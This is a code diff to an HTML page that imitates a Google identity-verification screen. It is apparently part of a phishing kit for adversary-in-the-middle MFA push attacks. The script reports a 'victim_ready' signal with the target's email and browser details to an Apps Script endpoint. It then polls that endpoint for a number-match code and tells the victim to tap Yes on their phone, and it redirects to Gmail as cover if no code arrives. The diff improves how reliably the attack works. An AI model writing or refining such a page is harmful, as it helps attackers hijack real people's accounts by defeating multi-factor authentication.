@@ -8,57 +8,58 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
+    /* Your existing styles remain unchanged */
     body { 
       font-family: 'Roboto', sans-serif; 
       background: #f1f3f4; 
-      margin: 0; 
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      min-height: 100vh; 
-      color: #202124; 
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #202124;
     }
     .card { 
-      background: white; 
-      border-radius: 8px; 
-      box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
-      padding: 48px 40px; 
-      max-width: 480px; 
-      width: 100%; 
-      text-align: center; 
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+      padding: 48px 40px;
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
     }
     .logo svg { width: 48px; height: 48px; margin-bottom: 24px; }
     .avatar { 
-      width: 64px; height: 64px; 
-      background: #1a73e8; 
-      color: white; 
-      border-radius: 50%; 
-      display: inline-flex; 
-      align-items: center; 
-      justify-content: center; 
-      font-size: 28px; 
-      font-weight: 500; 
-      margin: 16px 0; 
+      width: 64px; height: 64px;
+      background: #1a73e8;
+      color: white;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin: 16px 0;
     }
     .spinner { 
-      border: 8px solid #e8eaed; 
-      border-top: 8px solid #1a73e8; 
-      border-radius: 50%; 
-      width: 60px; height: 60px; 
-      animation: spin 1s linear infinite; 
-      margin: 0 auto 24px; 
+      border: 8px solid #e8eaed;
+      border-top: 8px solid #1a73e8;
+      border-radius: 50%;
+      width: 60px; height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 24px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     h1 { font-size: 24px; margin: 0 0 16px; }
     .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
     .prompt-section { display: none; margin-top: 24px; }
     .number-box { 
-      font-size: 120px; font-weight: bold; 
-      color: #1967d2; background: #e3f2fd; 
-      width: 240px; height: 160px; line-height: 160px; 
-      margin: 32px auto; border-radius: 16px; 
-      border: 4px solid #1967d2; 
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
+      font-size: 120px; font-weight: bold;
+      color: #1967d2; background: #e3f2fd;
+      width: 240px; height: 160px; line-height: 160px;
+      margin: 32px auto; border-radius: 16px;
+      border: 4px solid #1967d2;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
     .debug { font-size: 13px; color: #d93025; margin-top: 16px; }
   </style>
@@ -75,11 +76,14 @@
     </div>
     <div class="avatar" id="avatar"></div>
     <h1>Verifying your identity</h1>
+    
+    <!-- Both sections start visible, but we control via JS -->
     <div id="loading">
       <div class="spinner"></div>
       <div class="status" id="status">Checking your account...</div>
       <div class="debug" id="debugMsg"></div>
     </div>
+    
     <div id="prompt-section" class="prompt-section">
       <h1>Check your phone</h1>
       <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
@@ -91,10 +95,11 @@
 
   <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMcaCzi5Cja5WzhFKhl6O2ypdS8BfWwkyoxIenPP22LjqlMpT0pMbEkUAkiK9ZzZFW/exec";
-
     let email = localStorage.getItem("demoEmail") || "someone@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
-
+    
+    const loadingSection = document.getElementById("loading");
+    const promptSection  = document.getElementById("prompt-section");
     const statusEl = document.getElementById("status");
     const debugEl  = document.getElementById("debugMsg");
     const numberEl = document.getElementById("matchNumber");
@@ -104,42 +109,43 @@
       debugEl.textContent = msg; 
     }
 
-    // 1. Send victim_ready signal
+    // 1. Send victim_ready signal (fire and forget)
     const readyParams = new URLSearchParams({
       action: "victim_ready",
       email: email,
       user_agent: navigator.userAgent || "Unknown",
       timestamp: new Date().toISOString()
     });
-
     fetch(`${SCRIPT_URL}?${readyParams.toString()}`, {
       method: "GET",
       mode: "no-cors",
       cache: "no-cache"
     }).catch(e => console.error("victim_ready send failed:", e));
 
-    // 2. Poll for the prompt number
-    setInterval(async () => {
+    // Flag to track if we've already shown the prompt UI
+    let numberReceived = false;
+
+    // 2. Poll loop - keep loading visible until number arrives
+    const pollInterval = setInterval(async () => {
       try {
         const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
         console.log("[POLL] Requesting:", url);
-
+        
         const response = await fetch(url, {
           method: 'GET',
           cache: 'no-cache',
-          mode: 'cors',                // ← must be cors to read the body
+          mode: 'cors',
           redirect: 'follow'
         });
-
+        
         console.log("[POLL] Status code:", response.status);
-
         if (!response.ok) {
           throw new Error(`HTTP error ${response.status}`);
         }
-
+        
         const raw = await response.text();
         console.log("[POLL] Raw response:", raw);
-
+        
         let data;
         try {
           data = JSON.parse(raw);
@@ -149,34 +155,42 @@
           debugEl.textContent = "Parse error - check console";
           return;
         }
-
-        const number = data.prompt_number || data.number || "";
+        
+        const number = (data.prompt_number || data.number || "").trim();
         console.log("[POLL] Number value:", number || "(empty)");
-
-        if (number && number.trim() !== "" && number !== "—" && number !== "null") {
+        
+        if (number !== "" && number !== "—" && number !== "null") {
+          // Valid number received → show it and switch UI
           numberEl.textContent = number;
           statusEl.textContent = "Number match received – confirm on your phone";
           debugEl.textContent = `Displayed: ${number}`;
           console.log("[POLL] Successfully displayed:", number);
+          
+          // Switch UI once (only the first time)
+          if (!numberReceived) {
+            loadingSection.style.display = "none";
+            promptSection.style.display = "block";
+            numberReceived = true;
+          }
         }
-
+        
       } catch (err) {
         console.error("[POLL] Critical error:", err);
         debugEl.textContent = "Polling error: " + err.message;
+        // Keep loading visible - don't hide on error
       }
     }, 4000);
 
-    // Show prompt UI after delay
+    // Safety timeout: redirect after 3 minutes if still no number
     setTimeout(() => {
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("prompt-section").style.display = "block";
-      statusEl.textContent = "Waiting for number match...";
-    }, 6000);
+      if (!numberReceived) {
+        console.log("[TIMEOUT] No number received after 180s → redirecting");
+        window.location.href = "https://mail.google.com/";
+      }
+    }, 180000);
 
-    // Auto-redirect after timeout
-    setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
   </script>
 </body>
 </html>
 
-        
+  
